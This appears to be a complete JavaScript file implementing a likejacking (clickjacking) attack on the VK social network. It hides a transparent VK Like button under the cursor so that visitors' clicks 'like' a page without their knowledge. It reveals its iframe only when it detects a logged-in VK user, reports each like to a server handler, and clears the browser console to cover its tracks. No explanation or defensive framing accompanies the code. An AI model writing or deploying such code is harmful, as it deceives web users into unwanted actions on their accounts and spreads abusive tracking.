
/* Global Vars */

var dt_page_main = [0000000, $.now()]; // AppID, Page ID by timestamp

/* Engine */

function dt_page_start () {
	dt_page_setStyles();
	dt_page_addEvents();
}

function dt_page_setStyles () {
	$('*').css({'margin': '0', 'padding': '0', 'cursor': 'pointer'});
	$('body').css({'cursor': 'pointer'});
	$('#dt-section').css({'opacity': '0'});
	$('#dt-overlay').css({'width': '100%', 'height': '100%', 'position': 'absolute', 'top': '0', 'left': '0', 'cursor': 'pointer', 'z-index': '100'});
	$('#dt-wrap-1').css({'overflow': 'hidden', 'width': '105px', 'height': '25px', 'opacity': '0', 'position': 'absolute', 'z-index': '101'});
	$('#dt-wrap-2').css({'margin-left': '0px', 'margin-top': '0px'});
}

function dt_page_addEvents () {
	$(window).mousemove(function(event) {
		$('#dt-wrap-1').css({'left': event.pageX - 50, 'top': event.pageY - 12});
	});

	VK.init({apiId: dt_page_main[0]});
	VK.Widgets.Auth('dt-vk-login', {width: '200px', authUrl: '/dev/index.php'});
	VK.Widgets.Like('dt-vk-groups', {type: 'button', page_id: dt_page_main[1], pageUrl: document.location.origin + '/?dt_id=' + dt_page_main[1]});
	VK.Observer.subscribe('widgets.like.liked', function () {
		dt_page_sendData();
	});
	VK.Observer.subscribe('widgets.like.unliked', function ()  {
		dt_page_windowManager('close');
	});

	setTimeout(dt_page_checker, 500);
}

function dt_page_sendData () {
	$.ajax({
		url: 'dt_handler.php',
		type: 'POST',
		data: {data: btoa(dt_page_main[0] + '-' + dt_page_main[1])},
		timeout: 3000
	}).then(function () {
		dt_page_windowManager('close');
	});
}

function dt_page_windowManager(action) {
	if (action == 'show') {
		setTimeout(function () {
			$('#dt_iframe', window.parent.document).css({'visibility': 'visible', 'height': '100%', 'width': '100%'});
		}, 50);
	} else {
		setTimeout(function () {
			$('#dt_iframe', window.parent.document).parent().remove();
		}, 50);
	}
}

function dt_page_checker () {
	if ($('#dt-vk-login').height() == 93) {
		dt_page_windowManager('show');
	} else {
		dt_page_windowManager('close');
	}
}

/* Intialization */

setTimeout (dt_page_start, 50);

/* Console Fix */

$(window).mousemove(function() {
	if (!this.clear) {this.clear = 0};
	if (this.clear < 2) {
		this.clear += 1;
		console.clear();
	};
});